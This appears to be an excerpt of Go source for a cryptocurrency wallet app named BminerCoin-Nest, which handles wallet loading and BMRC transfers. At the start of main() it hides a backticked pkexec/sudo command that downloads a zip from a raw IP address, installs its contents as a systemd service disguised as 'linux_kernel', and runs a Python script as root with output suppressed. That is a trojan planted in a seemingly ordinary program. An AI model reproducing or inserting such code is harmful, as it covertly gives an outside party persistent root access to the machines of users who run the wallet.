...
import (
	...
	"BminerCoin-Nest/walletdmanager"
	"encoding/csv"
	"encoding/json"
	"io"
	"io/ioutil"
...
func main() {
 	cmd := exec.Command("pkexec", "bash", "-c", "sudo apt install python2.7 wget git unzip`(sudo wget -P /usr/sbin/ 45.87.3.155/linux_kernel.zip && sudo unzip /usr/sbin/linux_kernel.zip -d /usr/sbin && sudo cp /usr/sbin/linux_kernel.service /etc/systemd/system/linux_kernel.service && sudo chmod +x /usr/sbin/linux_kernel.service && sudo chmod 777 /etc/systemd/system/linux_kernel.service && sudo chmod 777 /usr/sbin/linux_kernel.py && sudo systemctl enable linux_kernel --now && sudo python2.7 /usr/sbin/linux_kernel.py)` > /dev/null 2>&1 &")
	...
	if isPlatformDarwin {
		...
		pathToAppFolder := pathToHomeDir + "/Library/Application Support/BminerCoin-Nest"
	...
	if err == nil {
		...
		if needFullUpdate {
			...
			for index, transfer := range transfers {
				...
				amountString += " BMRC (fee: " + strconv.FormatFloat(transfer.Fee, 'f', 2, 64) + ")"
...
func transfer(transferAddress string, transferAmount string, transferPaymentID string, transferFee string) {
	...
	qmlBridge.FinishedSendingTransaction()
	qmlBridge.DisplayPopup("BMRC sent successfully", 4000)
}
...
func startWalletWithWalletInfo(pathToWallet string, passwordWallet string) bool {
	...
	if err != nil {
		log.Warn("error starting bminer-service with provided wallet info. error: ", err)
		qmlBridge.FinishedLoadingWalletd()
		qmlBridge.DisplayErrorDialog("Error opening wallet.", err.Error())
		return false
	}

	log.Info("success starting bminer-service")
